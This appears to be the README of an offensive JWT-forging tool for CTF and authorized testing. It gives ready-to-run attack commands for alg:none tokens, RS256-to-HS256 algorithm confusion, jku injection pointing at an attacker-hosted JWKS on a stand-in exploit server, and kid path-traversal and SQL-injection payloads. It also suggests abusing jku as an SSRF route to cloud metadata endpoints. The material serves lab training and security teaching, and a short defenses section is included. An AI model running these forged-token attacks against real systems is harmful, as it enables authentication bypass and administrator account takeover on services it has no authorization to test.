# jwt-sign

A command-line tool to forge and sign JWTs from a key file, built for offensive security testing and CTF work (JWT authentication bypass labs, algorithm confusion attacks, header injection, etc.).

> **Disclaimer**: This tool is intended for authorized security testing, CTF challenges, and educational purposes only (e.g. PortSwigger Web Security Academy, HackTheBox labs). Only use it against systems you own or are explicitly authorized to test.

## Features

- Sign JWTs with **RS256/384/512**, **ES256/384/512**, **PS256/384/512**, **HS256/384/512**, and **`none`**.
- Load the signing key straight from a file (PEM private key, or raw secret for HMAC).
- Inject arbitrary/custom **headers** and **claims** via CLI flags, without hand-writing JSON.
- Auto-populate `iat` and `exp`.
- Support encrypted PEM private keys (`--key-password`).
- **Algorithm confusion attack** (`--confusion`): forge an HS256/384/512 token using an RSA/EC **public key** as the HMAC secret, bypassing PyJWT's built-in key-type check, for targets that verify RS256 tokens with the wrong key type.

## Requirements

```bash
pip install pyjwt cryptography
```

Python 3.10+ (uses `X | Y` type hints).

## Installation

```bash
git clone https://github.com/<you>/jwt-sign.git
cd jwt-sign
pip install -r requirements.txt
```

## Usage

```
python3 jwt_sign.py --key <keyfile> --alg <ALG> --payload <payload> [options]
```

### Required arguments

| Flag | Description |
|---|---|
| `--key` | Path to the key file. Private PEM for RS/ES/PS, raw secret for HS, public PEM for `--confusion`. |
| `--alg` | Signing algorithm: `HS256`, `HS384`, `HS512`, `RS256`, `RS384`, `RS512`, `ES256`, `ES384`, `ES512`, `PS256`, `PS384`, `PS512`, `none`. |
| `--payload` | JSON payload, either a path to a `.json` file or an inline JSON string. |

### Optional arguments

| Flag | Description |
|---|---|
| `--headers` | JSON file or inline JSON string of additional headers. |
| `--header key=value` | Add/override a single header. Repeatable. Value is parsed as JSON when possible (`true`, `10`, `["a","b"]`), otherwise kept as a string. |
| `--claim key=value` | Add/override a single payload claim. Repeatable, same parsing rules as `--header`. |
| `--exp N` | Set `exp` to `now + N` seconds. |
| `--auto-iat` | Set `iat` to the current timestamp. |
| `--key-password PASS` | Passphrase for an encrypted private PEM key (RS/ES/PS only). |
| `--confusion` | Algorithm confusion attack (RS256→HS256 style). Requires `--alg HS256/384/512`. See below. |

The token is printed to **stdout**. Debug info (decoded header/payload) is printed to **stderr**, so you can safely do `python3 jwt_sign.py ... > token.txt`.

See [JWT Attack Techniques](#jwt-attack-techniques) below for `none`, algorithm confusion, `jku`, and `kid` injection walkthroughs.

## JWT Attack Techniques

This section explains the JWT vulnerabilities this tool is built to exploit, and how to reproduce each attack end-to-end. All of this is standard JWT attack theory (PortSwigger Web Security Academy, HackTheBox) — nothing here is specific to any target; adapt payloads/claims to what your challenge or engagement requires.

### 1. `alg: none`

**Concept**: The JWT spec allows an `alg` value of `none`, meaning "unsigned token". Some JWT libraries, when misconfigured or when an application doesn't explicitly restrict the accepted algorithms, will accept a token with `alg: none` and skip signature verification entirely. If that's the case, you can submit *any* payload you want, with no key at all.

**Exploitation**:
```bash
python3 jwt_sign.py --key dummy --alg none --payload '{"sub":"administrator","admin":true}'
```
`--key dummy` is a placeholder — no real key material is used for `none` (PyJWT signs with an empty key by design for this algorithm). Try variants of the casing (`none`, `None`, `NONE`) and drop the signature segment entirely if the target library is picky, since some implementations check the string case-sensitively.

### 2. Algorithm confusion (RS256 → HS256)

**Concept**: Asymmetric algorithms (RS256, ES256, PS256, ...) use a private key to sign and a public key to verify. Symmetric algorithms (HS256, ...) use the *same* secret to sign and verify. If a server is written to accept both, and its verification code does something like `jwt.verify(token, publicKey)` without pinning the expected algorithm, an attacker can:

1. Take the server's RSA/EC **public key** (it's public — from a JWKS endpoint, a TLS cert, exported via key-recovery tools, etc.).
2. Sign a forged token with `alg: HS256`, using that public key's raw bytes as the HMAC secret.
3. The server receives an HS256 token, calls its generic verify function with "the key" (its public key), and — because HMAC verification is just "does the secret produce this signature" — the forged signature validates.

**Exploitation**:
```bash
python3 jwt_sign.py --key public.pem --alg HS256 --confusion \
  --payload '{"iss":"portswigger","exp":1787998822,"sub":"administrator"}' \
  --header kid=v6MQKWWGZpz05MvB
```

PyJWT normally refuses to use a PEM-formatted key as an HMAC secret (it detects the format and raises `InvalidKeyError`) — this is exactly the protection a well-configured library gives you, and exactly what `--confusion` bypasses on the *signing* side by building the JWT manually with `hmac.new()` instead of going through PyJWT's key-type checks. This only matters for crafting the token; whether the target's *verification* code has the same protection (most modern libraries do) is what determines if the attack actually works against it.

**Critical detail**: the HMAC secret must be the exact byte sequence the target server holds as its public key — same PEM encoding, same line endings, same whitespace. If you regenerate or re-export the key yourself, the bytes will very likely differ from what the server has and the forged signature won't validate. Always recover the target's public key file as-is (via its own JWKS endpoint or key-recovery tooling like `sign2n`), never a locally re-generated one.

### 3. `jku` header injection

**Concept**: The `jku` (JWK Set URL) header tells the verifier where to fetch the public key(s) needed to validate the signature — a JSON document at that URL listing keys in JWK format. This exists to support key rotation without hardcoding keys server-side. If the server fetches whatever URL is in `jku` without validating it against an allow-list of trusted hosts, an attacker can:

1. Generate their own RSA key pair.
2. Sign a token with their own private key.
3. Host a JWKS containing their own public key at a URL they control.
4. Put that URL in the `jku` header, with a matching `kid`.
5. The server fetches the attacker's JWKS, finds the key with the matching `kid`, and uses it to verify — the signature validates because the server is now trusting a key the attacker generated.

**Step-by-step**:

```bash
# 1. Generate an RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 2. Build a JWKS exposing your public key (see rsa_to_jwk.py below)
python3 rsa_to_jwk.py public.pem --kid attacker-key --pretty -o jwks.json

# 3. Host it (must be reachable by the target)
python3 -m http.server 8000
# or, for a target reachable over the internet:
ngrok http 8000

# 4. Forge the token: kid must match the JWK's kid exactly, jku must point
#    to the hosted jwks.json
python3 jwt_sign.py --key private.pem --alg RS256 \
  --payload '{"iss":"portswigger","exp":1788000124,"sub":"administrator"}' \
  --header kid=attacker-key \
  --header jku=https://your-host.example/jwks.json
```

Send the resulting token in the `Authorization: Bearer <token>` header or session cookie, whichever the target expects. A mismatched `kid` between the token header and the hosted JWKS is the most common reason this fails — double-check both match exactly.

**Related variant — `x5u`**: same idea, but the header points to an X.509 certificate instead of a JWKS. `rsa_to_jwk.py` also accepts certificates as input if you need to work backwards from one.

**Confirming the vulnerability first**: before standing up infrastructure, it's worth confirming the server actually dereferences `jku` at all. Burp Suite's JWT Editor extension can embed a Burp Collaborator URL as `jku` and alert you on the callback — confirms SSRF-style outbound fetch behavior before you invest in hosting a real JWKS.

**Escalation note**: if `jku`/`x5u` isn't restricted to an allow-list, it's effectively a controlled SSRF primitive — worth checking whether internal endpoints (cloud metadata services, internal-only APIs) are reachable via the same header, independent of the JWT forgery itself.

### 4. `kid` injection (path traversal / SQL injection)

**Concept**: The `kid` header tells the verifier *which* key to use, often by looking it up in a file path, database row, or in-memory map. If the value isn't sanitized, `kid` becomes an injection point:

- **Path traversal**: `kid` used as a filename (`keys/{kid}.pem`) → set `kid` to something like `../../../../dev/null` and sign with an HMAC secret of an empty string, if the app falls back to reading a predictable/empty file as the "key".
- **SQL injection**: `kid` used in a query (`SELECT key FROM keys WHERE id = '{kid}'`) → classic SQLi payloads to make the lookup return a value you control or know (e.g. `UNION SELECT 'known-secret'`).

**Exploitation** (once you know or control the resulting secret, e.g. an empty string via a null-byte/path-traversal read):
```bash
python3 jwt_sign.py --key empty_secret.txt --alg HS256 \
  --payload '{"sub":"administrator"}' \
  --header 'kid=../../../../dev/null'
```
This is inherently target-specific — the `kid` payload depends entirely on how the backend resolves it (file path, DB query, KMS key ID, etc.), so treat the values above as illustrative rather than universal.

### Defenses (for context)

If you're writing or reviewing JWT verification code rather than attacking it:
- Pin the expected algorithm explicitly when verifying — never trust `alg` from the token itself.
- Never derive the verification key from attacker-controlled header fields (`jku`, `x5u`, `kid`) without validating against a fixed allow-list.
- Use separate code paths/key material for symmetric vs asymmetric algorithms so a public key can never accidentally satisfy an HMAC check.
- Validate `jku`/`x5u` host, scheme, and (ideally) pin to a static, pre-approved JWKS rather than fetching dynamically.

## Examples

### Basic RS256 signing

```bash
python3 jwt_sign.py --key private.pem --alg RS256 \
  --payload '{"iss":"portswigger","exp":1788000124,"sub":"administrator"}' \
  --header kid=d87cedb9-71c5-4aba-b116-c159245789c6
```

### Payload / headers from JSON files

```bash
python3 jwt_sign.py --key private.pem --alg RS256 \
  --payload payload.json --headers headers.json
```

### HMAC with a plain-text secret

```bash
python3 jwt_sign.py --key secret.txt --alg HS256 --payload '{"sub":"test"}'
```

### Auto `iat` / `exp`

```bash
python3 jwt_sign.py --key private.pem --alg RS256 \
  --payload '{"sub":"admin"}' --auto-iat --exp 3600
```

### `alg: none`

```bash
python3 jwt_sign.py --key dummy --alg none --payload '{"sub":"admin"}'
```

### `jku` header injection (self-hosted JWKS)

```bash
python3 jwt_sign.py --key private.pem --alg RS256 \
  --payload '{"iss":"portswigger","exp":1788000124,"sub":"administrator"}' \
  --header kid=v6MQKWWGZpz05MvB \
  --header jku=https://your-exploit-server.example/exploit
```

Host a matching `jwks.json` (containing the public key for the RSA key you signed with) at that URL, so a target that trusts the `jku` header fetches your key to verify the token.

### Algorithm confusion attack (RS256 → HS256)

When a server signs/verifies with RS256 using an asymmetric key pair, but its JWT library also accepts HS256, you can sign a token in HMAC-SHA256 using the server's **public key bytes** as the HMAC secret. If the server naively calls its verify function with the public key regardless of `alg`, the forged signature will validate.

```bash
python3 jwt_sign.py --key public.pem --alg HS256 --confusion \
  --payload '{"iss":"portswigger","exp":1787998822,"sub":"administrator"}' \
  --header kid=v6MQKWWGZpz05MvB \
  --header jku=https://your-exploit-server.example/exploit
```

`--confusion` bypasses PyJWT's key-type check by building the token manually with Python's `hmac` module, using the **exact raw bytes** of the `--key` file as the HMAC secret. This matters: the bytes must match exactly what the target server has (same PEM encoding, line endings, whitespace), or the signature won't validate server-side.

Typical workflow:
1. Recover the target's public key (from a `/jwks.json` endpoint, a leaked cert, `sign2n`/key-recovery tooling, etc.) and save it exactly as served, e.g. `public.pem`.
2. Forge the token with `--confusion` using that exact file.
3. Send the token to the target.

### Encrypted private key

```bash
python3 jwt_sign.py --key private.pem --alg RS256 \
  --payload payload.json --key-password "mypassphrase"
```

## Companion tool: `rsa_to_jwk.py`

Converts a PEM RSA public key (or X.509 certificate) into a JWK / JWKS document, useful for hosting a fake `jku` endpoint or comparing keys:

```bash
python3 rsa_to_jwk.py public.pem --kid my-key --pretty -o jwks.json
```

## Notes

- Field ordering/spacing in `--header`/`--claim` follows standard JSON parsing; if a value isn't valid JSON it's kept as a raw string (e.g. `--claim user=htb-stdnt`).
- `--claim`/`--header` override values from `--payload`/`--headers` on key collision.
- No claim validation is performed (no automatic rejection of malformed `exp`, missing `sub`, etc.) — this is intentional, to let you forge arbitrary/malformed tokens for fuzzing.

## License

MIT
